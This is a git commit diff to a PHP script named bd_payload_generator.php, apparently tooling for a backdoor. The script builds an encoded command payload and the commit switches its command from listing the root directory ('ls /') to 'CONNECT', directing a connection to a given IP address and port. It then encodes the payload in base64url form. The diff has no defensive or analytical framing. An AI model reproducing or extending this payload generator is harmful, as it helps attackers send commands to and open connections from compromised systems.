f0edc6ac03e79f6d9c6050add9e4eec4d7347d02
thra5os <thguerbet@gmail.com>
2025-01-23 17:26:31 +0100

    optimized payload gen

--- bd_payload_generator.php
+++ bd_payload_generator.php
@@ -11,12 +11,12 @@ function blv_encode($info) {
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 $payload = [
-    2 => "ls /", // CMD
+    2 => "CONNECT", // CMD
     3 => "mark123",  // MARK (unique identifier for session)
     6 => "192.168.45.139", // Target IP (for CONNECT case)
     7 => "12345",      // Port (for CONNECT case)
 ];
-
+print_r($payload);
 $encoded = base64_encode(blv_encode($payload));
 $encoded = strtr($encoded, "+/", "-_");
 
